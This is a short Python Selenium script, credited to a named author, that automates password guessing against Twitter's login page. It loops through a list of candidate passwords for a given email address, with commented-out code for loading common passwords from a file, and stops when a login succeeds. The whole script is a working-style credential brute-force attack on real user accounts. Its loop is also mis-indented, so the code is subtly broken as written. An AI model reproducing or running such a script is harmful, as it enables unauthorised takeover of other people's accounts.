"""
This code is written by
AMAN KAZI
"""

from selenium import webdriver
import time

browser = webdriver.Chrome('chromedriver.exe')

browser.get("https://twitter.com/login?username_disabled=true&redirect_after_login=%2Fexplore")
time.sleep(3)

#Use password.txt file which includes some common passwords.
# with open("password.txt") as passfile:
# 	passlist=passfile.readlines()
# 	for x in range(len(passlist)):
# 		if("\n" in passlist[x]):
# 			passlist[x]=passlist[x].strip("\n")
# 		else:
# 			pass

passlist=['1234','allpasswordsgoes here']

	for y in passlist:
		try:
			time.sleep(5)
			username = browser.find_element_by_xpath('//*[@id="react-root"]/div/div/div[2]/main/div/div/form/div/div[1]/label/div/div[2]/div/input')
			username.clear()
			password = browser.find_element_by_xpath('//*[@id="react-root"]/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input')
			login    = browser.find_element_by_xpath('//*[@id="react-root"]/div/div/div[2]/main/div/div/form/div/div[3]/div/div')
			time.sleep(2)
			username.send_keys("Insert the email address")
			password.send_keys(y)
			login.click()
			time.sleep(2)
			
			if(browser.current_url=='https://twitter.com/login?username_disabled=true&redirect_after_login=%2Fexplore'):
				browser.get("https://twitter.com/login?username_disabled=true&redirect_after_login=%2Fexplore")
				time.sleep(2)
				continue
			elif(browser.current_url=='https://twitter.com/explore'):
				print("You are logged in")
				break
		except:
			print("Something went wrong")
			break
